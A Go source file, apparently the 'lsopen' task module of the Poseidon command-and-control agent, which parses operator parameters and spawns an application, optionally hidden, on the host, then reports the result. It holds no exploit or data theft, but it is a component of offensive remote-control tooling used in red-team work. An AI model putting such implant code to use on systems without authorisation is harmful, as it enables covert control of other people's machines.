package lsopen

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Application string   `json:"application"`
	HideApp     bool     `json:"hideApp"`
	AppArgs     []string `json:"appArgs"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	r, err := runCommand(args.Application, args.HideApp, args.AppArgs)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	if r.Successful {
		msg.UserOutput = "Successfully spawned application."
		msg.Completed = true
		task.Job.SendResponses <- msg
	} else {
		msg.SetError("Failed to spawn application.")
		task.Job.SendResponses <- msg
	}
	return
}
